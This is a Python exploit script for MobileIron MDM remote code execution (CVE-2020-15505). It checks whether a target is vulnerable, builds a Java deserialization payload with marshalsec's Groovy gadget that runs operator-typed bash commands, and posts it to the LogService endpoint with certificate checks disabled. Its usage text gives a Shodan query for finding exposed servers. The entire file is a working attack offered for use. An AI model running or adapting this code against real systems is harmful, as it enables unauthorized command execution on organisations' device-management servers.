#!/usr/bin/env python
# coding=utf-8
# code by Amir

from sys import version
import requests
import sys
import subprocess
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def load(name):
    header = b'\x63\x02\x00\x48\x00\x04'+b'test'
    with open(name, 'rb') as f:
        return header+f.read()


def send(url, payload):
    #proxies = {'http':'127.0.0.1:8888'}
    # Referer is Required for MobileIron MDM
    headers = {'Content-Type': 'x-application/hessian',
               'Referer': 'https://test.com'}
    data = payload
    res = requests.post(url, headers=headers, data=data, verify=False)
    return res.text


def check(url):
    res = requests.get(url=url, verify=False, timeout=5)
    # print(res.text)
    if 'This method/operation is not allowed.' not in res.text:
        print('[-] Not Vulnerable!')
        c = input('Continue?[y/N]') or 'N'
        if c.lower() is 'n':
            exit()
    else:
        print('[+] Vulnerable!')


def main():
    if len(sys.argv) != 2:
        print("MobileIron RCE Exploit (CVE-2020-15505)")
        print("!java required in Env Path!")
        print('shodan: http.title:"MobileIron User Portal" or mifs')
        print("Usage: python exploit.py https://target.com")
        return

    url = '{}/mifs/.;/services/LogService'.format(sys.argv[1].strip('/'))

    check(url)

    while 1:
        cmd = input('$cmd> ')
        subprocess.run(
            'java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Hessian Groovy "/bin/bash" "-c" "{}" > exp.ser'.format(cmd), shell=True)

        send(url, load('exp.ser'))


if __name__ == '__main__':
    main()
